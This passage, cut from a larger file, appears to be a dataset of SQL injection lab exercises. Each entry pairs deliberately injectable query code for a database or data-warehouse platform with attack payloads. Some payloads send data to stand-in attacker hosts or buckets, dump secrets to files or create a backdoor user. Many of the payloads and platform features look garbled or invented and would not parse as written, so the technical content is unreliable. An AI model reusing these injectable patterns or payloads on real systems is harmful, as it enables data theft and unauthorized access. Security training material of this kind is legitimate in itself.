              "Lab Description": "A data warehouse allows setting refresh options for materialized views with user-provided values that are concatenated directly into refresh queries. The options are not properly sanitized, allowing attackers to modify refresh behavior and execute arbitrary commands during view maintenance operations. This vulnerability is particularly dangerous in automated refresh scenarios.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify materialized view refresh endpoints",
                "Inject through refresh options",
                "Trigger view refresh operations",
                "Bypass view dependency checks",
                "Execute commands during refresh"
              ],
              "Vulnerability name": "Materialized View Refresh Injection",
              "srcCode": "ALTER MATERIALIZED VIEW user_stats SET REFRESH OPTIONS (\" + userOptions + \")",
              "payloads": [
                "\"async\"='true') FROM (SELECT * FROM pg_matviews) x--",
                "\"concurrently\"='true'); COPY (SELECT * FROM secrets) TO '/tmp/leak'--"
              ]
            },


            
        
                {
                  "Lab scenario": "SQL Injection in Oracle SDO_GEOMETRY Constructor",
                  "Lab Description": "A GIS application builds Oracle spatial queries using unsanitized user input in SDO_GEOMETRY constructors. The WKT (Well-Known Text) parameters are concatenated directly into spatial queries, allowing injection through crafted geometry definitions that break out of the spatial function context.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify SDO_GEOMETRY usage in queries",
                    "Craft malicious WKT containing SQL payload",
                    "Bypass Oracle spatial validation",
                    "Access non-spatial tables via UNION",
                    "Exfiltrate data through error messages"
                  ],
                  "Vulnerability name": "Oracle Spatial Injection",
                  "srcCode": "SELECT * FROM buildings WHERE SDO_RELATE(geometry, SDO_GEOMETRY('\" + userWkt + \"', 4326)) = 'TRUE'",
                  "payloads": [
                    "POINT(0 0)', 4326)) = 'TRUE' OR 1=1--",
                    "POLYGON((0 0,1 0,1 1,0 1,0 0))') FROM (SELECT * FROM all_tables) x--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in SQL Server HierarchyId Parse()",
                  "Lab Description": "A hierarchical data application uses unsanitized input in SQL Server's HierarchyId.Parse() function. The string representation of hierarchy paths is concatenated directly into queries, allowing injection through crafted path strings that break out of the hierarchy context.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify HierarchyId.Parse() usage",
                    "Craft malicious path strings",
                    "Bypass hierarchy validation",
                    "Access system tables via error-based injection",
                    "Traverse unauthorized hierarchy branches"
                  ],
                  "Vulnerability name": "SQL Server HierarchyId Injection",
                  "srcCode": "SELECT * FROM org_chart WHERE node = hierarchyid::Parse('\" + userPath + \"')",
                  "payloads": [
                    "/1/') OR 1=1--",
                    "/1/2/3/') FROM (SELECT * FROM sys.objects) x--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in PostgreSQL JSONB Path Queries",
                  "Lab Description": "A document store application builds PostgreSQL JSONB path queries with unsanitized user input. The path expressions are concatenated directly into jsonb_path_query functions, allowing injection through crafted JSON path strings that break out of the document context.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify jsonb_path_query usage",
                    "Craft malicious JSON path expressions",
                    "Bypass JSON path validation",
                    "Access relational tables via type coercion",
                    "Exfiltrate data through JSON aggregation"
                  ],
                  "Vulnerability name": "PostgreSQL JSONB Path Injection",
                  "srcCode": "SELECT jsonb_path_query(document, '\" + userPath + \"') FROM docs",
                  "payloads": [
                    "$.* ? (@.id == 1) RETURNING VARCHAR DEFAULT (SELECT version()) ON ERROR",
                    "lax $[*] ? (1=1)) columns (x varchar) as (select * from pg_user)--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in MySQL Generated Columns",
                  "Lab Description": "A schema-migration tool dynamically creates MySQL generated columns using unsanitized input in the generation expression. The expressions are concatenated directly into ALTER TABLE statements, allowing injection during column creation that persists in the schema.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify generated column creation",
                    "Inject through column expression",
                    "Bypass expression validation",
                    "Persist malicious logic in schema",
                    "Trigger expression evaluation"
                  ],
                  "Vulnerability name": "MySQL Generated Column Injection",
                  "srcCode": "ALTER TABLE users ADD COLUMN hash VARCHAR(64) GENERATED ALWAYS AS (\" + userExpr + \") STORED",
                  "payloads": [
                    "MD5(CONCAT(password,'salt')) FROM (SELECT * FROM mysql.user) x--",
                    "LEFT(username,1)) WHERE 1=0 UNION SELECT 1,2,3--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in SQL Server Graph MATCH Clauses",
                  "Lab Description": "A graph analytics application builds SQL Server graph queries with unsanitized input in MATCH clauses. The node/edge patterns are concatenated directly into queries, allowing injection through crafted graph patterns that break out of the graph context.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify MATCH clause usage",
                    "Craft malicious graph patterns",
                    "Bypass graph syntax validation",
                    "Access non-graph tables via UNION",
                    "Traverse unauthorized graph paths"
                  ],
                  "Vulnerability name": "SQL Server Graph MATCH Injection",
                  "srcCode": "SELECT * FROM MATCH('\" + userPattern + \"')",
                  "payloads": [
                    "(n:User)-[r]->(m) WHERE n.name = 'admin' OR 1=1--",
                    "(n)-[r]->(m)) FROM (SELECT * FROM sys.tables) x--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Snowflake Stored Procedure Dynamic SQL",
                  "Lab Description": "A Snowflake data pipeline uses JavaScript stored procedures that build dynamic SQL with unsanitized input. The input is concatenated directly into execute immediate statements, allowing injection through crafted strings that bypass Snowflake's normal parameterization protections.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify stored procedure calls",
                    "Inject through procedure arguments",
                    "Bypass JavaScript sandbox restrictions",
                    "Execute arbitrary Snowflake SQL",
                    "Access account usage views"
                  ],
                  "Vulnerability name": "Snowflake Stored Procedure Injection",
                  "srcCode": "var query = 'SELECT * FROM table WHERE col = \\'' + INPUT + '\\''; snowflake.execute({sqlText: query});",
                  "payloads": [
                    "' UNION SELECT * FROM information_schema.tables--",
                    "' || (SELECT current_role()) || '"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Google BigQuery Scripting Control Structures",
                  "Lab Description": "A BigQuery scripting workflow uses unsanitized input in IF/CASE control structures that are interpolated into dynamic SQL. The conditions are concatenated directly into script logic, allowing injection through crafted boolean expressions that modify control flow.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify scripting control structures",
                    "Inject through conditional expressions",
                    "Bypass script validation",
                    "Modify query execution path",
                    "Access unauthorized datasets"
                  ],
                  "Vulnerability name": "BigQuery Scripting Control Injection",
                  "srcCode": "IF '\" + userCondition + \"' THEN SELECT * FROM table1; ELSE SELECT * FROM table2; END IF;",
                  "payloads": [
                    "1=1 THEN SELECT * FROM sensitive_data--",
                    "EXISTS(SELECT * FROM region-us.INFORMATION_SCHEMA.SCHEMATA) THEN SELECT 1--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Azure Synapse Serverless OPENROWSET",
                  "Lab Description": "A Synapse analytics pipeline uses OPENROWSET with unsanitized input for file paths or format options. The parameters are concatenated directly into external table queries, allowing injection through crafted file specifications that break out of the data loading context.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify OPENROWSET usage",
                    "Inject through file path/format parameters",
                    "Bypass external table validation",
                    "Access system views via UNION",
                    "Exfiltrate data through file operations"
                  ],
                  "Vulnerability name": "Synapse OPENROWSET Injection",
                  "srcCode": "SELECT * FROM OPENROWSET(BULK '\" + userPath + \"', FORMAT = '\" + userFormat + \"')",
                  "payloads": [
                    "C:\\legit.csv') WITH (FORMAT='CSV') UNION SELECT * FROM sys.sql_logins--",
                    "https://attacker.com/payload') AS [\" + (SELECT name FROM sys.tables) + \"]--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Databricks Delta Lake Time Travel",
                  "Lab Description": "A Databricks notebook uses Delta Lake time travel with unsanitized version/timestamp parameters. The values are concatenated directly into table version queries, allowing injection through crafted time specifications that access unauthorized data versions.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify time travel queries",
                    "Inject through version/timestamp parameters",
                    "Bypass time format validation",
                    "Access historical data versions",
                    "Recover deleted records"
                  ],
                  "Vulnerability name": "Delta Lake Time Travel Injection",
                  "srcCode": "spark.sql(\"SELECT * FROM table VERSION AS OF \" + userVersion)",
                  "payloads": [
                    "0 UNION SELECT * FROM table@v1--",
                    "(SELECT MAX(version) FROM (DESCRIBE HISTORY table))--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Amazon Redshift Spectrum External Tables",
                  "Lab Description": "A Redshift cluster defines Spectrum external tables with unsanitized input in table properties or location paths. The parameters are concatenated directly into DDL statements, allowing injection when the external tables are queried.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify external table definitions",
                    "Inject through table properties/locations",
                    "Bypass Spectrum validation",
                    "Access unauthorized S3 paths",
                    "Exfiltrate data through external queries"
                  ],
                  "Vulnerability name": "Redshift Spectrum Injection",
                  "srcCode": "CREATE EXTERNAL TABLE ext_sales (LOCATION '\" + userLocation + \"')",
                  "payloads": [
                    "s3://legit-bucket/') WITH (FORMAT 'TEXTFILE') UNION SELECT * FROM svv_external_tables--",
                    "s3://attacker-bucket/payload')) FROM (SELECT * FROM pg_user) x--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Snowflake External Stage COPY Options",
                  "Lab Description": "A Snowflake pipeline uses COPY INTO commands with user-controlled stage options. The options are concatenated directly into load/unload operations, allowing injection through crafted file format specifications that modify data loading behavior.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify COPY INTO commands",
                    "Inject through format options",
                    "Bypass stage validation",
                    "Modify loaded data",
                    "Exfiltrate data through file operations"
                  ],
                  "Vulnerability name": "Snowflake COPY Options Injection",
                  "srcCode": "COPY INTO table FROM @stage PATTERN = '.*.csv' FILE_FORMAT = (TYPE = CSV FIELD_OPTIONALLY_ENCLOSED_BY = '\" + userDelim + \"')",
                  "payloads": [
                    "' FIELD_DELIMITER=',') FROM (SELECT * FROM information_schema.tables) x--",
                    "\" SKIP_HEADER=1) RETURNING *--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Google Cloud Spanner DML Returning Clause",
                  "Lab Description": "A Spanner application builds DML statements with unsanitized input in RETURNING clauses. The column expressions are concatenated directly into mutation operations, allowing injection that persists after data modification.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify DML RETURNING usage",
                    "Inject through column expressions",
                    "Bypass mutation validation",
                    "Access system tables via subqueries",
                    "Persist malicious logic in transactions"
                  ],
                  "Vulnerability name": "Spanner DML Returning Injection",
                  "srcCode": "UPDATE users SET last_login = CURRENT_TIMESTAMP() WHERE user_id = '\" + userId + \"' THEN RETURN \" + userColumns",
                  "payloads": [
                    "* FROM (SELECT * FROM information_schema.tables) x--",
                    "user_id, (SELECT COUNT(*) FROM sensitive_table) AS count--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Azure Data Explorer KQL Embedded SQL",
                  "Lab Description": "A Kusto (KQL) query uses embedded SQL with unsanitized input. The SQL fragments are concatenated directly into KQL execute_sql() functions, allowing injection through crafted SQL that breaks out of the KQL context.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify execute_sql() usage",
                    "Inject through SQL fragments",
                    "Bypass KQL validation",
                    "Access unauthorized clusters",
                    "Exfiltrate data through cross-database queries"
                  ],
                  "Vulnerability name": "Kusto Embedded SQL Injection",
                  "srcCode": "let sql = 'SELECT * FROM openquery('\" + userLink + \"', ''SELECT * FROM table'')'; execute_sql(sql)",
                  "payloads": [
                    "legit_link', 'SELECT 1')) UNION SELECT * FROM information_schema.tables--",
                    "attacker_link', 'SELECT * FROM sys.configurations'))--"
                  ]
                },
            
                {
                  "Lab scenario": "SQL Injection in Apache Druid Native Query SQL Fragments",
                  "Lab Description": "A Druid cluster processes native queries containing embedded SQL fragments with unsanitized input. The SQL portions are concatenated directly into query planning, allowing injection that bypasses Druid's usual SQL layer protections.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify native query endpoints",
                    "Inject through SQL fragments",
                    "Bypass query planning validation",
                    "Access system metadata",
                    "Execute native Druid queries"
                  ],
                  "Vulnerability name": "Druid Native Query Injection",
                  "srcCode": "{\"query\":\"{\\\"queryType\\\":\\\"sql\\\",\\\"sql\\\":\\\"SELECT * FROM datasource WHERE \" + userCondition + \"\\\"}\"}",
                  "payloads": [
                    "1=1 UNION SELECT * FROM sys.segments--",
                    "__time > 0) FROM (SELECT * FROM druid_segments) x--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in InfluxDB Flux to SQL Conversion",
                  "Lab Description": "A monitoring system converts InfluxDB Flux queries to SQL with unsanitized input in filter expressions. The Flux predicates are concatenated directly into SQL WHERE clauses, allowing injection through crafted filter logic.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify Flux to SQL conversion",
                    "Inject through filter() parameters",
                    "Bypass Flux syntax validation",
                    "Execute arbitrary SQL",
                    "Exfiltrate metrics data"
                  ],
                  "Vulnerability name": "Flux-to-SQL Injection",
                  "srcCode": "from(bucket:\"metrics\") |> filter(fn: (r) => r._field == '\" + userField + \"') |> toSQL()",
                  "payloads": [
                    "value' OR r._measurement == 'secret_metrics'--",
                    "cpu' FROM (SELECT * FROM sql_metrics) x--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregates Materialization",
                  "Lab Description": "A time-series platform creates TimescaleDB continuous aggregates with user-provided refresh policies. The policy parameters are concatenated directly into materialization queries, allowing injection during automated refreshes.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify continuous aggregates",
                    "Inject through refresh parameters",
                    "Trigger materialization jobs",
                    "Bypass time bucket validation",
                    "Compromise hypertable data"
                  ],
                  "Vulnerability name": "Timescale Materialization Injection",
                  "srcCode": "CREATE MATERIALIZED VIEW metrics_agg WITH (timescaledb.continuous) AS SELECT time_bucket('\" + userInterval + \"', time) FROM metrics",
                  "payloads": [
                    "1 hour') FROM (SELECT * FROM _timescaledb_catalog.hypertable)--",
                    "interval '1 day') WHERE 1=0) UNION SELECT * FROM chunks--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in CockroachDB Change Data Capture Filters",
                  "Lab Description": "A CockroachDB changefeed uses user-provided filters that are concatenated directly into CDC queries. The filters allow injection that persists across change events, compromising all captured data.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify changefeed creation",
                    "Inject through filter expressions",
                    "Trigger data changes",
                    "Bypass CDC validation",
                    "Exfiltrate data via webhooks"
                  ],
                  "Vulnerability name": "CockroachCDC Filter Injection",
                  "srcCode": "CREATE CHANGEFEED FOR TABLE users WITH filter = '\" + userFilter + \"'",
                  "payloads": [
                    "SELECT * FROM users WHERE type = 'admin'--",
                    "SELECT *, (SELECT version()) FROM users--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
                  "Lab Description": "A data pipeline uses DuckDB's HTTPFS extension with user-provided HTTP headers. The headers are concatenated directly into remote requests, allowing injection when accessing cloud storage.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify HTTPFS usage",
                    "Inject through header parameters",
                    "Bypass request validation",
                    "Modify remote data access",
                    "Exfiltrate credentials"
                  ],
                  "Vulnerability name": "DuckDB HTTP Header Injection",
                  "srcCode": "SET s3_region='\" + userRegion + \"'; SET s3_access_key_id='\" + userKey + \"'; SET s3_secret_access_key='\" + userSecret + \"'",
                  "payloads": [
                    "us-east-1'); COPY (SELECT * FROM sqlite_master) TO 's3://attacker-bucket/leak'--",
                    "legit-region', s3_access_key_id='x', s3_secret_access_key='y') FROM (SELECT * FROM duckdb_settings)--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Materialized View Index Predicates",
                  "Lab Description": "A database creates materialized view indexes with user-provided predicate expressions. The predicates are concatenated directly into index creation, allowing persistent injection that affects all queries using the index.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify indexed view creation",
                    "Inject through predicate expressions",
                    "Trigger index usage",
                    "Bypass predicate validation",
                    "Persist malicious logic in schema"
                  ],
                  "Vulnerability name": "Materialized View Index Injection",
                  "srcCode": "CREATE INDEX idx_filtered ON materialized_view (column) WHERE '\" + userPredicate + \"'",
                  "payloads": [
                    "1=1) WITH (FILLFACTOR=100) UNION SELECT * FROM pg_indexes--",
                    "column IS NOT NULL) FROM (SELECT * FROM pg_matviews) x--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in SQL Server PolyBase External Table Locations",
                  "Lab Description": "A SQL Server instance creates PolyBase external tables with user-provided location paths. The paths are concatenated directly into DDL statements, allowing injection when querying external data.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify external table creation",
                    "Inject through location parameters",
                    "Bypass PolyBase validation",
                    "Access unauthorized storage",
                    "Execute remote commands"
                  ],
                  "Vulnerability name": "PolyBase Location Injection",
                  "srcCode": "CREATE EXTERNAL TABLE ext_data (LOCATION = '\" + userLocation + \"')",
                  "payloads": [
                    "/data/files') FROM (SELECT * FROM sys.sql_logins) x--",
                    "C:\\import\\data.csv'); CREATE USER attacker WITH PASSWORD 'hack'--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Google BigQuery Remote Function Responses",
                  "Lab Description": "A BigQuery implementation calls remote functions where the HTTP response is interpolated directly into SQL. Malicious function responses can inject SQL that bypasses BigQuery's normal parameterization.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify remote function calls",
                    "Craft malicious HTTP responses",
                    "Bypass response validation",
                    "Execute arbitrary SQL",
                    "Access cross-project datasets"
                  ],
                  "Vulnerability name": "BigQuery Remote Function Injection",
                  "srcCode": "CREATE FUNCTION remote_process(arg STRING) RETURNS STRING REMOTE WITH CONNECTION remote_conn OPTIONS (endpoint = 'https://api.example.com/process?param=' || arg)",
                  "payloads": [
                    "1' UNION SELECT dataset_id FROM region-us.INFORMATION_SCHEMA.SCHEMATA--",
                    "legit' FROM (SELECT * FROM EXTERNAL_QUERY('connection', 'SELECT 1'))--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Snowflake External Function Response Headers",
                  "Lab Description": "A Snowflake external function processes HTTP response headers as SQL values. Malicious headers can inject SQL that persists during the entire function execution context.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify external functions",
                    "Inject through response headers",
                    "Bypass header validation",
                    "Execute stacked queries",
                    "Persist payloads in session"
                  ],
                  "Vulnerability name": "Snowflake Function Header Injection",
                  "srcCode": "CREATE EXTERNAL FUNCTION api_call(param STRING) RETURNS STRING HEADERS = {'result-sql': '\" + userHeader + \"'} API_INTEGRATION = api_int AS 'https://api.example.com'",
                  "payloads": [
                    "' FROM (SELECT * FROM information_schema.tables)--",
                    "1'); SELECT system$whitelist()--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Databricks Unity Catalog Table Properties",
                  "Lab Description": "A Databricks environment sets Unity Catalog table properties with user-provided values. The properties are concatenated directly into catalog metadata queries, allowing injection during table operations.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify table property settings",
                    "Inject through property values",
                    "Trigger catalog queries",
                    "Bypass Unity Catalog validation",
                    "Access metastore data"
                  ],
                  "Vulnerability name": "Unity Catalog Property Injection",
                  "srcCode": "ALTER TABLE db.table SET TBLPROPERTIES ('\" + userKey + \"' = '\" + userValue + \"')",
                  "payloads": [
                    "owner' = 'admin') FROM (SELECT * FROM system.information_schema.tables)--",
                    "comment' = 'test'); SELECT * FROM system.information_schema.columns--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Trino System Access Control Rules",
                  "Lab Description": "A Trino cluster defines system access control rules with user-provided conditions. The conditions are concatenated directly into authorization queries, allowing injection during permission checks.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify access control endpoints",
                    "Inject through rule conditions",
                    "Trigger authorization checks",
                    "Bypass security validation",
                    "Elevate privileges"
                  ],
                  "Vulnerability name": "Trino Authorization Injection",
                  "srcCode": "CREATE AUTHORIZATION rule_name ON SCHEMA schema_name TO USER user_name WITH CONDITION '\" + userCondition + \"'",
                  "payloads": [
                    "1=1) OR (SELECT 1 FROM system.metadata.catalogs)--",
                    "user_name = current_user()); INSERT INTO system.runtime.roles VALUES ('admin')--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in Presto Resource Group Selectors",
                  "Lab Description": "A Presto cluster configures resource group selectors with user-provided expressions. The expressions are concatenated directly into resource allocation queries, allowing injection during query scheduling.",
                  "Difficulty Level": "Medium",
                  "Solution Steps": [
                    "Identify resource group configuration",
                    "Inject through selector expressions",
                    "Trigger query scheduling",
                    "Bypass selector validation",
                    "Modify resource allocation"
                  ],
                  "Vulnerability name": "Presto Resource Group Injection",
                  "srcCode": "CREATE RESOURCE GROUP group_name WITH (soft_memory_limit='80%', selector='\" + userSelector + \"')",
                  "payloads": [
                    "true) FROM (SELECT * FROM system.metadata.catalogs) x--",
                    "user='admin' OR 1=1)--"
                  ]
                },
                {
                  "Lab scenario": "SQL Injection in ClickHouse User-Defined Function SQL",
                  "Lab Description": "A ClickHouse cluster creates SQL UDFs with user-provided function bodies. The SQL is concatenated directly into function creation, allowing persistent injection that affects all queries using the function.",
                  "Difficulty Level": "Hard",
                  "Solution Steps": [
                    "Identify UDF creation endpoints",
                    "Inject through function SQL",
                    "Trigger function execution",
                    "Bypass UDF validation",
                    "Persist malicious logic"
                  ],
                  "Vulnerability name": "ClickHouse UDF Injection",
                  "srcCode": "CREATE FUNCTION custom_filter AS (x) -> '\" + userSql + \"'",
                  "payloads": [
                    "x OR (SELECT * FROM system.processes)--",
                    "1=1) FROM (SELECT * FROM system.functions)--"
                  ]
                },



                
                    {
                      "Lab scenario": "SQL Injection in PostgreSQL Range Type Constructor",
                      "Lab Description": "A scheduling application builds PostgreSQL range queries (tsrange, numrange) with unsanitized user input. Attackers can break out of the range context through specially crafted boundary expressions that evaluate to SQL commands.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify range type usage in queries",
                        "Craft malicious range bounds containing SQL",
                        "Bypass range validation with infinity markers",
                        "Execute commands through range constructor functions",
                        "Exfiltrate data via range error messages"
                      ],
                      "Vulnerability name": "PostgreSQL Range Injection",
                      "srcCode": "SELECT * FROM events WHERE period = tsrange('\" + startTime + \"', '\" + endTime + \"')",
                      "payloads": [
                        "2023-01-01', '2023-12-31'::text) FROM (SELECT * FROM pg_user)--",
                        "now()', infinity'::text) WHERE 1=0 UNION SELECT 1,2,3--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in MySQL Spatial Reference System Parameters",
                      "Lab Description": "A GIS system builds MySQL spatial queries with dynamic SRID (Spatial Reference System Identifier) parameters. The numeric SRID values are concatenated directly into ST_Transform calls, allowing injection through mathematical expressions.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify ST_Transform function usage",
                        "Inject through SRID parameter expressions",
                        "Bypass numeric validation with arithmetic",
                        "Access system tables via spatial function errors",
                        "Pivot attack through geometry tables"
                      ],
                      "Vulnerability name": "MySQL SRID Injection",
                      "srcCode": "SELECT ST_AsText(ST_Transform(geom, \" + userSrid + \")) FROM parcels",
                      "payloads": [
                        "4326) FROM (SELECT * FROM mysql.user) x--",
                        "0+(SELECT COUNT(*) FROM information_schema.tables))--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in SQL Server Temporal Table AS OF Clause",
                      "Lab Description": "A historical data application uses SQL Server temporal tables with dynamic AS OF timestamps. The timestamp strings are concatenated directly into temporal queries, allowing injection through crafted date literals.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify temporal query endpoints",
                        "Inject through AS OF timestamp parameter",
                        "Bypass date format validation",
                        "Access historical versions of sensitive tables",
                        "Recover deleted records via versioning"
                      ],
                      "Vulnerability name": "SQL Server Temporal Injection",
                      "srcCode": "SELECT * FROM Employees FOR SYSTEM_TIME AS OF '\" + userTimestamp + \"'",
                      "payloads": [
                        "2023-01-01 00:00:00') FROM (SELECT * FROM sys.objects) x--",
                        "GETDATE()') WHERE 1=0 UNION SELECT * FROM history.Employees--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Oracle Text INDEX PARAMETERS",
                      "Lab Description": "A document search system creates Oracle Text indexes with dynamic parameters. The parameter strings are concatenated into index DDL, allowing persistent injection that affects all queries using the index.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify index creation endpoints",
                        "Inject through PARAMETERS clause",
                        "Trigger index maintenance operations",
                        "Bypass CTXSYS privilege checks",
                        "Persist malicious logic in index metadata"
                      ],
                      "Vulnerability name": "Oracle Text Index Injection",
                      "srcCode": "CREATE INDEX doc_idx ON documents(text_column) INDEXTYPE IS CTXSYS.CONTEXT PARAMETERS('\\'' + userParams + '\\'')",
                      "payloads": [
                        "SYNC (ON COMMIT)') FROM (SELECT * FROM all_indexes) x--",
                        "FILTER CTXSYS.NULL_FILTER SECTION GROUP CTXSYS.HTML_SECTION_GROUP') WHERE 1=0 UNION SELECT 1 FROM dual--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Snowflake Tag-Based Masking Policies",
                      "Lab Description": "A Snowflake data governance system creates tag-based masking policies with dynamic conditions. The policy expressions are concatenated directly into CREATE MASKING POLICY statements, allowing injection through crafted tag values.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify masking policy creation",
                        "Inject through policy condition parameters",
                        "Trigger policy evaluation on sensitive data",
                        "Bypass tag value validation",
                        "Access unmasked data through policy flaws"
                      ],
                      "Vulnerability name": "Snowflake Tag Policy Injection",
                      "srcCode": "CREATE MASKING POLICY mask_ssn AS (val STRING) RETURNS STRING -> CASE WHEN '\\'' + userCondition + '\\'' THEN '***' ELSE val END",
                      "payloads": [
                        "1=1 THEN (SELECT current_role()) ELSE NULL END--",
                        "EXISTS(SELECT * FROM information_schema.tables) THEN val ELSE NULL END--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Google BigQuery ARRAY_AGG Order By Clause",
                      "Lab Description": "A analytics dashboard builds BigQuery ARRAY_AGG functions with dynamic ORDER BY clauses. The sort expressions are concatenated directly into array aggregation, allowing injection through crafted ordering specifications.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify ARRAY_AGG usage in queries",
                        "Inject through ORDER BY expressions",
                        "Bypass array function constraints",
                        "Access project metadata via sort errors",
                        "Exfiltrate data through array elements"
                      ],
                      "Vulnerability name": "BigQuery ARRAY_AGG Injection",
                      "srcCode": "SELECT ARRAY_AGG(name ORDER BY '\\'' + userSort + '\\'' DESC) FROM users",
                      "payloads": [
                        "1) FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
                        "(SELECT COUNT(*) FROM sensitive_table)) OVER()--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Azure Synapse CETAS External File Paths",
                      "Lab Description": "A Synapse pipeline uses CETAS (CREATE EXTERNAL TABLE AS SELECT) with dynamic output paths. The file locations are concatenated directly into DDL, allowing injection through crafted storage paths.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify CETAS statement usage",
                        "Inject through external file location",
                        "Bypass storage account validation",
                        "Modify exported data contents",
                        "Exfiltrate data via path manipulation"
                      ],
                      "Vulnerability name": "Synapse CETAS Path Injection",
                      "srcCode": "CREATE EXTERNAL TABLE ext_data WITH (LOCATION = '\\'' + userPath + '\\'') AS SELECT * FROM source",
                      "payloads": [
                        "wasbs://container@storage.blob.core.windows.net/path') WITH (FORMAT='PARQUET') UNION SELECT * FROM sys.sql_logins--",
                        "/tmp/legit') FROM (SELECT * FROM sys.dm_pdw_exec_requests) x--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Databricks Delta Lake VACUUM Retention",
                      "Lab Description": "A Databricks job runs Delta Lake VACUUM commands with dynamic retention periods. The duration strings are concatenated directly into vacuum operations, allowing injection through crafted time expressions.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify VACUUM command usage",
                        "Inject through retention parameter",
                        "Bypass duration validation",
                        "Access historical data versions",
                        "Recover deleted records via vacuum flaws"
                      ],
                      "Vulnerability name": "Delta Lake VACUUM Injection",
                      "srcCode": "spark.sql(\\\"VACUUM delta.`/path/to/table` RETAIN '\\\\\\\" + userHours + \\\\\\\"' HOURS\\\")",
                      "payloads": [
                        "0 HOURS') FROM (DESCRIBE HISTORY delta.`/path/to/table`)--",
                        "168 HOURS' WITH SCHEMA (SELECT * FROM .`/path/to/sensitive_table`)--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Amazon Redshift SUPER Type Path Queries",
                      "Lab Description": "A Redshift application queries SUPER type columns with dynamic path expressions. The JSON paths are concatenated directly into queries, allowing injection through crafted path syntax.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify SUPER type query endpoints",
                        "Inject through JSON path parameters",
                        "Bypass path validation with unnesting",
                        "Access system tables via path errors",
                        "Exfiltrate data through nested queries"
                      ],
                      "Vulnerability name": "Redshift SUPER Path Injection",
                      "srcCode": "SELECT json_extract_path_text(json_column, '\\\"' + userPath + '\\\"') FROM semi_structured_data",
                      "payloads": [
                        "key') FROM (SELECT * FROM svv_external_tables) x--",
                        "array[0]') WHERE 1=0 UNION SELECT 1,2,3--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Snowflake External Table Refresh",
                      "Lab Description": "A Snowflake pipeline refreshes external tables with dynamic parameters. The refresh options are concatenated directly into ALTER EXTERNAL TABLE statements, allowing injection during metadata updates.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify external table refresh points",
                        "Inject through refresh parameters",
                        "Trigger metadata reload",
                        "Bypass file format validation",
                        "Modify table schema definitions"
                      ],
